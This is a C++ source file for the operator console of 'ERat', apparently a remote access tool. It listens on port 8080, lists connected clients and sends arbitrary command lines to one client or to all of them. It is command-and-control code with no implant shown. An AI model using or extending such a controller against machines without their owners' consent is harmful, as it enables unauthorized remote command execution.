#include "Shell.hpp"

#include <iostream>
#include <string>
#include "String.hpp"

namespace ERat
{
	Shell::Shell() : _server(8080)
	{

	}

	bool	Shell::initialize()
	{
		_map.insert(std::make_pair("cmd", std::bind(&ERat::Shell::executeCommand, this, std::placeholders::_1)));
		_map.insert(std::make_pair("list", std::bind(&ERat::Shell::listClients, this, std::placeholders::_1)));
		_map.insert(std::make_pair("use", std::bind(&ERat::Shell::useClient, this, std::placeholders::_1)));
		_serverThread = std::make_unique<std::thread>(&SocketServer::run, &_server);
		return true;
	}

	void	Shell::run()
	{
		cpp::String	line;

		std::cout << "> ";
		while (std::getline(std::cin, line))
		{
			if (strcmp(line.c_str(), "exit") == 0)
			{
				auto clients = _server.getClients();
				auto it = clients.begin();
				int i = 0;

				while (it != clients.end()) {
					std::cout << "Fermeture " << " #" << i << ": " << (*it)->getIp() << std::endl;
					(*it)->close();
					++it;
					++i;
				}
				std::cout << "Close server" << std::endl;
				_server.close();
				::exit(0);
			}

			auto tokens = line.tokenize(" \t");
			if (_map.find(tokens.front()) != _map.end()) {
				_map[tokens.front()](tokens);
			}
			else if (!line.empty()) {
				std::cout << "Command not found." << std::endl;
			}
			if (_usedClient) {
				std::cout << "[" << _usedClient->getIp() << "]> ";
			}
			else if (_allClient == 1){
				std::cout << "[All]>";
			}
			else {
				std::cout << "> ";
			}
		}
	}

	bool	Shell::executeCommand(std::list<cpp::String> const& args)
	{
		std::string commandLine;
		auto	it = args.begin();

		while (++it != args.end()) {
			commandLine = commandLine + *it + " ";
		}
		if (commandLine.empty()) {
			std::cout << "Missing command args" << std::endl;
		}
		else {
			if (_allClient == 1){
//					std::cout << "ON ENVOI à tout le monde" << std::endl;

					auto clients = _server.getClients();
					auto it = clients.begin();
					int i = 0;

					while (it != clients.end()) {
						ERat::Message	message(ERat::Message::Cmd);
						message.setBody(commandLine.c_str(), commandLine.size());
						std::cout << "Sending " << commandLine.c_str() << " #" << i << ": " << (*it)->getIp() << std::endl;
						(*it)->addMessage(message);
						++it;
						++i;
					}
					return true;
			}
			else if (!_usedClient) {
				std::cout << "You must first select a client (list)" << std::endl;
				return false;
			}
			ERat::Message	message(ERat::Message::Cmd);

			message.setBody(commandLine.c_str(), commandLine.size());
			_usedClient->addMessage(message);
		}
		return true;
	}

	bool	Shell::listClients(std::list<cpp::String> const&)
	{
		std::cout << "Connected clients list:" << std::endl;
		auto clients = _server.getClients();
		auto it = clients.begin();
		int i = 0;

		while (it != clients.end()) {
			std::cout << "#" << i << ": " << (*it)->getIp() << std::endl;
			++it;
			++i;
		}
		return true;
	}


	bool	Shell::useClient(std::list<cpp::String> const& args)
	{
		auto	it = args.begin();

		_allClient = 0;
		_usedClient.reset();
		++it;
		if (it != args.end()) {
			auto i = std::atoi((*it).c_str());

			if (_server.getClients().size() > 0 && strcmp((*it).c_str() , "all") == 0){
				std::cout << "Use all client" << std::endl;
				_allClient = 1;
			}
			else if(i < _server.getClients().size()) {
				_usedClient = _server.getClients()[i];
				std::cout << "Use client: " << _usedClient->getIp() << std::endl;
			}

			else{
				std::cout << "Nodody clients" << std::endl;
				return false;
			}
		}
		else {
			std::cout << "Missing socket number" << std::endl;
			return false;
		}
		return true;
	}

	Shell::~Shell() {
		_server.close();
		_serverThread->join();
	}
}
